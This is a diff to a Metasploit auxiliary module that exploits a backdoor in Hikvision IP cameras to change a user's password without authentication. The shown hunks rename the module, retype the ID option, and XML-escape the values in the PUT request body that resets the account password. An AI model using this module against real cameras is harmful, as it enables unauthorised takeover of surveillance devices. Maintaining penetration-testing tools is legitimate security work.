@@ -12,7 +12,7 @@ class MetasploitModule < Msf::Auxiliary
     super(
       update_info(
         info,
-        'Name' => 'Hikvision IP Camera Unauthenticated Password Change',
+        'Name' => 'Hikvision IP Camera Unauthenticated Password Change Via Backdoor Creds',
         'Description' => %q{
           Many Hikvision IP cameras contain a backdoor that allows unauthenticated impersonation of any configured user account.
           The vulnerability has been present in Hikvision products since 2014. In addition to Hikvision-branded devices, it
@@ -51,7 +51,7 @@ class MetasploitModule < Msf::Auxiliary
         Opt::RPORT(80),
         OptString.new('USERNAME', [ true, 'Username for password change', 'admin']),
         OptString.new('PASSWORD', [ true, 'New Password (at least 2 UPPERCASE, 2 lowercase and 2 special characters', 'Pa$$W0rd']),
-        OptString.new('ID', [ true, 'ID (default 1 for admin)', '1']),
+        OptInt.new('ID', [ true, 'ID (default 1 for admin)', 1]),
         OptBool.new('STORE_CRED', [false, 'Store credential into the database.', true])
       ]
     )
@@ -123,7 +123,7 @@ class MetasploitModule < Msf::Auxiliary
 
     begin
       print_status("Starting the password reset for #{datastore['USERNAME']}...")
-      post_data = %(<User version="1.0" xmlns="http://www.hikvision.com/ver10/XMLSchema">\r\n<id>#{datastore['ID']}</id>\r\n<userName>#{datastore['USERNAME']}</userName>\r\n<password>#{datastore['PASSWORD']}</password>\r\n</User>)
+      post_data = %(<User version="1.0" xmlns="http://www.hikvision.com/ver10/XMLSchema">\r\n<id>#{datastore['ID'].to_s.encode(xml: :text)}</id>\r\n<userName>#{datastore['USERNAME']&.encode(xml: :text)}</userName>\r\n<password>#{datastore['PASSWORD']&.encode(xml: :text)}</password>\r\n</User>)
 
       res = send_request_cgi({
         'method' => 'PUT',
